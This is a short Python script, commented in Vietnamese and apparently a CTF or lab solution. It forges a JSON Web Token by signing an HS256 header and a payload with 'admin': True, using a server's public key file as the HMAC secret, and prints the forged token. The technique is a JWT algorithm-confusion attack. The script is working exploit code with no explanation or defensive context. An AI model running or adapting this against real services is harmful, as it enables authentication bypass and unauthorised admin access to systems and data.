import json, base64, hmac, hashlib

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = {"typ": "JWT", "alg": "HS256"}
payload = {"username": "huei", "admin": True}

# Đọc public key đã lưu từ file (dùng bytes luôn)
with open("key_pub", "rb") as f:
    secret = f.read()

header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())

msg = f"{header_b64}.{payload_b64}".encode()

# Ký lại bằng HMAC-SHA256
signature = hmac.new(secret, msg, hashlib.sha256).digest()
signature_b64 = b64url_encode(signature)

token = f"{header_b64}.{payload_b64}.{signature_b64}"
print("[+] Forged token:\n", token)
